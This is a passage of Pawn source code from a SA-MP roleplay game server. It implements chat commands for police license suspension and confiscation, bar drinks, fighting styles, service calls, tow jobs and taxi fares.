                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a flying license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Fly License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Officer %s has suspended your Fly License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pFlyLic] = 0;
                                PlayerInfo[giveplayerid][pFlyLicS] = stime;
                                SaveKonVal(giveplayerid, "pFlyLic", 0);
                                SaveKonVal(giveplayerid, "pFlyLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"Boating",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend boating [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pBoatLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Boat license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Boating License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Officer %s has suspended your Boating License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pBoatLic] = 0;
                                PlayerInfo[giveplayerid][pBoatLicS] = stime;
                                SaveKonVal(giveplayerid, "pBoatLic", 0);
                                SaveKonVal(giveplayerid, "pBoatLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"materials",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend materials [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pMatsLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a materials license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Materials License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Officer %s has suspended your Materials License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pMatsLic] = 0;
                                PlayerInfo[giveplayerid][pMatsLicS] = stime;
                                SaveKonVal(giveplayerid, "pMatsLic", 0);
                                SaveKonVal(giveplayerid, "pMatsLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"Weapons",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend weapons [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pGunLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Weapon license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Weapons License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Officer %s has suspended your Weapons License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pGunLic] = 0;
                                PlayerInfo[giveplayerid][pGunLicS] = stime;
                                SaveKonVal(giveplayerid, "pGunLic", 0);
                                SaveKonVal(giveplayerid, "pGunLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"driving",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend driving [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pCarLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Driving license to suspend.");
                        return true;
                    }
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Driving License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Officer %s has suspended your Driving License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pCarLic] = 0;
                                PlayerInfo[giveplayerid][pCarLicS] = stime;
                                SaveKonVal(giveplayerid, "pCarLic", 0);
                                SaveKonVal(giveplayerid, "pCarLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_WHITE, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTRED, "Unknown Suspend name");
                    return true;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not a Police Department.");
                return true;
            }
        }
        return true;
    }
    if(strcmp(cmd, "/take", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-Duty.");
                return 1;
            }
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SCM(playerid, CRISTIAN, "|__________________ Take Licenses __________________|");
                    SCM(playerid, COLOR_WHITE,"USAGE: /take [licensename] [playerid/PartOfName]");
                    SCM(playerid, COLOR_GREY, "Available names: Driverlic, Flylic, saillic ");
                    SCM(playerid, COLOR_GREY, "Available names: Gunlic, Weapons, Drugs, Materials");
                    SCM(playerid, CRISTIAN, "|_________________________________________________|");
                    return 1;
                }
                if(strcmp(x_nr,"driverlic",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take driverlic [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Drivers License.", giveplayername);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Drivers License.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                PlayerInfo[giveplayerid][pCarLic] = 0;
                                SaveKonVal(giveplayerid, "pCarLic", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"flylic",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take flylic [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Flying License.", giveplayername);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Flying License.", sendername);
                                SendClientMessage(giveplayerid,COL_SYN, string);
                                PlayerInfo[giveplayerid][pFlyLic] = 0;
                                SaveKonVal(giveplayerid, "pFlyLic", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"gunlic",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take gunlic [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Weapon License.", giveplayername);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Weapon License.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                PlayerInfo[giveplayerid][pGunLic] = 0;
                                SaveKonVal(giveplayerid, "pGunLic", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"saillic",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take saillic [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Boat License.", giveplayername);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Boat License.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                PlayerInfo[giveplayerid][pBoatLic] = 0;
                                SaveKonVal(giveplayerid, "pBoatLic", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"weapons",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take weapons [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Weapons.", giveplayer);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Weapons.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                ResetPlayerTofang(giveplayerid);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"drugs",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take drugs [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Drugs.", giveplayer);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s has taken away your Drugs.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                PlayerInfo[giveplayerid][pDrugs] = 0;
                                SaveKonVal(giveplayerid, "pDrugs", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"materials",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take materials [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                new giveplayername[64];
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
                                format(string, sizeof(string), "You have taken away %s's Materials.", giveplayer);
                                SendClientMessage(playerid, COL_SYN, string);
                                format(string, sizeof(string), "Officer %s as taken away your Materials.", sendername);
                                SendClientMessage(giveplayerid, COL_SYN, string);
                                PlayerInfo[giveplayerid][pMats] = 0;
                                SaveKonVal(giveplayerid, "pMats", 0);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "Unknown Take name");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not a Cop.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/drink", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAtBar(playerid))
            {
                    new x_nr[256];
                    x_nr = strtok(cmdtext, idx);
                    if(!strlen(x_nr)) {
                        SendClientMessage(playerid, CRISTIAN, "|__________________ Bar Drinks __________________|");
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /drink [drinkname]");
                        SendClientMessage(playerid, COLOR_GRAD4, "Alcohol: Beer ($1), Tequila ($2), Vodka ($1), Wine ($1), Whiskey ($1)");
                        SendClientMessage(playerid, COLOR_GRAD4, "Juice: Coca-Cola ($1), Fanta ($1), Prigat ($1), Schweppes ($1), Sprite ($1)");
                        SendClientMessage(playerid, COLOR_GRAD4, "Other drinks: Caffe ($1), Cocktail ($1), Soda($1), Water ($1)");
                        SendClientMessage(playerid, CRISTIAN, "|________________________________________________|");
                        return 1;
                    }
                    if(strcmp(x_nr,"beer",true) == 0)
                    {

                        GivePlayerPool(playerid, - 1);
                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"vodka",true) == 0)
                    {
                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"whiskey",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"wine",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"tequila",true) == 0)
                    {
                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
                        GivePlayerPool(playerid, - 2);
                        FixKhoon(playerid);

                    }
                    else if(strcmp(x_nr,"water",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"soda",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"coca-cola",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"schweppes",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"prigat",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"fanta",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"sprite",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"caffe",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else if(strcmp(x_nr,"cocktail",true) == 0)
                    {

                        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
                        GivePlayerPool(playerid, - 1);
                        FixKhoon(playerid);
                    }
                    else
                    {
                        SCM(playerid,COLOR_ALI,"Invalid drink name.");
                        SendClientMessage(playerid, CRISTIAN, "|__________________ Bar Drinks __________________|");
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /drink [drinkname]");
                        SendClientMessage(playerid, COLOR_GRAD4, "Alcohol: Beer ($6), Tequila ($20), Vodka ($10), Wine ($10), Whiskey ($15)");
                        SendClientMessage(playerid, COLOR_GRAD4, "Juice: Coca-Cola ($5), Fanta (5$), Prigat (7$), Schweppes (5$), Sprite (5$)");
                        SendClientMessage(playerid, COLOR_GRAD4, "Other drinks: Caffe ($3), Cocktail ($7), Soda($2), Water ($2)");
                        SendClientMessage(playerid, CRISTIAN, "|________________________________________________|");
                        return 1;
                    }
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALI, "You are not at a Bar.");
                return 1;
            }
        }
        return 1;
    }
/*----------------------------------------------------------------------------*///----
    if (strcmp("/fightstyle", cmd, true, 10) == 0)
    {
      if(!PlayerToPoint(2.0,playerid,757.5751,5.6157,1000.7015))
            {
                SendClientMessage(playerid, COLOR_LIGHTRED, "You are not at LS GYM.");
                return 1;
            }
         ShowPlayerDialog(playerid, 61, DIALOG_STYLE_LIST, "Fighting Styles:", "Elbow\nBoxing\nGrabkick\nKneehead\nKung-Fu\nNormal", "Select", "Cancel");
         return 1;
    }
    if(strcmp(cmd, "/service", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new x_nr[256];
            x_nr = strtok(cmdtext, idx);
            if(!strlen(x_nr)) {
                SendClientMessage(playerid, COLOR_WHITE, "|__________________ Service Names __________________|");
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /service [name]");
                SendClientMessage(playerid, COLOR_GREY, "Available names: Taxi, Medic, Mechanic");
                SendClientMessage(playerid, COLOR_WHITE, "|________________________________________________|");
                return 1;
            }
            if(strcmp(x_nr,"taxi",true) == 0)
            {
            if(IsPlayerInAnyVehicle(playerid))
            {
            SCM(playerid,COLOR_YELLOW,"You can't call any taxi driver when you are in a car");
            return 1;
            }
                if(TaxiDrivers < 1)
                {
                    SendClientMessage(playerid, COLOR_TAXI, "There is no Taxi Drivers On Duty at the moment, try again later.");
                    return 1;
                }
                if(TransportDuty[playerid] > 0)
                {
                    SendClientMessage(playerid, COLOR_TAXI, "You can't call for a Taxi now.");
                    return 1;
                }
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "(%d) %s need a Taxi Driver. (use: /accept taxi %d) to accept the call", playerid, sendername, playerid);
                SendFamilyMessage(10, COLOR_TAXI, string);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have called for a Taxi Driver, wait for a reply.");
            IWantTaxi[playerid] = 1;
                return 1;
            }
            else if(strcmp(x_nr,"medic",true) == 0)
            {
                if(Medics < 1)
                {
                    SendClientMessage(playerid, COLOR_MEDIC, "There is no Medics On Duty at the moment, try again later.");
                    return 1;
                }
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "(%d) %s is in need of a Medic. (use /accept medic %d) to accept the call", playerid,sendername,playerid);
                SendRadioMessage(4, COLOR_MEDIC, string);
                SendClientMessage(playerid, COLOR_MEDIC, "You have called for a Medic, wait for a reply.");
                IWantMedic[playerid] = 1;
                return 1;
            }
            else if(strcmp(x_nr,"mechanic",true) == 0)
            {
            if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_LIGHTBLUE,"You are not in a vehicle.");
                if(Mechanics < 1)
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "There is no Car Mechanics On Duty at the moment, try again later.");
                    return 1;
                }
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "** %s [ID : %d] is need a Car Mechanic. (use: /accept mechanic %d) to accept the call", sendername,playerid,playerid);
                SendJobMessage(7, COLOR_LIGHTBLUE, string);
                SendClientMessage(playerid, COLOR_MEDIC, "You have called for a Car Mechanic, wait for a reply.");
                IWantMechanic[playerid] = 1;
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALI, "Unknown service name.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/towls", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)
            {
                if(IsPlayerInVehicle(playerid, tcc1) || IsPlayerInVehicle(playerid, tcc2) || IsPlayerInVehicle(playerid, tcc3) || IsPlayerInVehicle(playerid, tcc4) || IsPlayerInVehicle(playerid, tcc5))
                {
                    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                    {
                        if(PlayerInfo[playerid][pTow] >= 1)
                        {
                            if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                            if(towtimer[playerid] == 1) return SendClientMessage(playerid, COLOR_CRS3, "** You already towed a car, wait 3 minutes!");
                            PlayerInfo[playerid][pTow] -= 1;
                            SaveKonVal(playerid, "pTow", PINFO[playerid][pTow]);
                            OnCheckpoint[playerid] = 1;
                            CP[playerid] = 199;
                            SetPlayerCheckpoint(playerid, 2409.8416,-1425.7860,23.9826, 5.0);
                            SendClientMessage(playerid, COLOR_YELLOW, "Drive to Warehouse to destroy the towed car.");
                            towtimer[playerid] = 1;
                            SetTimerEx("towtime", 180000, 0, "d", playerid);
                        }
                        else
                        SendClientMessage(playerid, COLOR_GRAD1, "** You cannot tow any car till PayDay.");
                    }
                    else
                    SendClientMessage(playerid, COLOR_GRAD1, "** You dont towed a car !");
                }
                else
                SendClientMessage(playerid, COLOR_GRAD1, "** You are not in a Tow Truck !");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/towlv", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)
            {
                if(IsPlayerInVehicle(playerid, tcc1) || IsPlayerInVehicle(playerid, tcc2) || IsPlayerInVehicle(playerid, tcc3) || IsPlayerInVehicle(playerid, tcc4) || IsPlayerInVehicle(playerid, tcc5))
                {
                    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                    {
                        if(PlayerInfo[playerid][pTow] >= 1)
                        {
                        if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                            if(towtimer[playerid] == 1) return SendClientMessage(playerid, COLOR_CRS3, "** You already towed a car, wait 1 minutes!");
                            PlayerInfo[playerid][pTow] -= 1;
                            SaveKonVal(playerid, "pTow", PINFO[playerid][pTow]);
                            OnCheckpoint[playerid] = 1;
                            CP[playerid] = 199;
                            SetPlayerCheckpoint(playerid, 2201.7668,938.9688,10.6974, 5.0);
                            SendClientMessage(playerid, COLOR_YELLOW, "Drive to Warehouse to destroy the towed car.");
                            towtimer[playerid] = 1;
                            SetTimerEx("towtime", 60000, 0, "d", playerid);
                        }
                        else
                        SendClientMessage(playerid, COLOR_GRAD1, "** You cannot tow any car till PayDay.");
                    }
                    else
                    SendClientMessage(playerid, COLOR_GRAD1, "** You dont towed a car !");
                }
                else
                SendClientMessage(playerid, COLOR_GRAD1, "** You are not in a Tow Truck !");
            }
        }
        return 1;
    }

    if(strcmp(cmd,"/fare",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] == 10||PlayerInfo[playerid][pLeader] == 10|| PlayerInfo[playerid][pJob] == 14)
            {
                if(TransportDuty[playerid] > 0)
                {
                    if(TransportDuty[playerid] == 1)
                    {
                        TaxiDrivers -= 1;
                    }
/*                    else if(TransportDuty[playerid] == 2)
                    {
                        BusDrivers -= 1;
                    }*/
                    TransportDuty[playerid] = 0;
                    format(string, sizeof(string), "You are now Off Duty and earned $%d.", TransportMoney[playerid]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                    GivePlayerPool(playerid, TransportMoney[playerid]);
